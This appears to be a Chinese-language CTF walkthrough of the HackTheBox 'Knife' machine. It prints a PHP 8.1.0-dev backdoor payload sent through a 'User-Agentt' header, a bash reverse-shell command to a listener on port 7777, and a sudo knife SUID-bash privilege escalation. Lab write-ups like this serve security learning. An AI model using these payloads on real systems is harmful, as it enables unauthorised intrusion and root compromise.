---
layout:     post
title:      HackTheBox Knife
subtitle:   HackTheBox
date:       2021-06-01
author:     heria
header-img: img/post-bg-024.jpeg
catalog: true
tags:
---

![image-20210528164955544](C:\Users\Heria.Chen.GAIAWORKS\AppData\Roaming\Typora\typora-user-images\image-20210528164955544.png)

## 信息收集

nmap -sS -sV -sC 10.10.10.242

![image-20210528164911058](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528164911058.png)

发现开放22和80端口，80端口啥都没得点

![image-20210528165953268](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528165953268.png)

## 渗透

burp抓包获取到php版本信息

![image-20210528171120154](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528171120154.png)

php/8.1.0-dev

检索漏洞，相关资料如下

```
https://blog.csdn.net/zy15667076526/article/details/116447864
```

![image-20210528171458492](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528171458492.png)



漏洞验证，添加user-agentt字段，确实存在漏洞

![image-20210528172435792](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528172435792.png)



可以执行命令

```
User-Agentt: zerodiumsystem("id");
```

![image-20210528172917917](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528172917917.png)

尝试反弹shell

kali开启监听7777端口

之后数据包添加

```
User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >& /dev/tcp/ip/7777 0>&1'");
```

拿到低权限

![image-20210601102037838](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601102037838.png)

之后找到user.txt拿到第一个flag

![image-20210601102226262](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601102226262.png)

## 提权

查看用户sodu权限

```
sudo -l
```

![image-20210601103038708](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601103038708.png)

由于shell容易断连，通过python获得一个更加稳定的shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210601103224852](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601103224852.png)

发现knife可以通过exec执行scirpt

![image-20210601105336334](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601105336334.png)

进一步在提示站点上发现knife可以运行.rb文件

![image-20210601105537885](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601105537885.png)

```
echo "system('chmod +s /bin/bash')" > exploit.rb
sudo /usr/bin/knife exec exploit.rb
/bin/bash -p
```

-s参数含义

![image-20210601110024150](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601110024150.png)

![image-20210601104410530](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601104410530.png)

之后找到root.txt获得第二个flag

![image-20210601104112992](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210601104112992.png)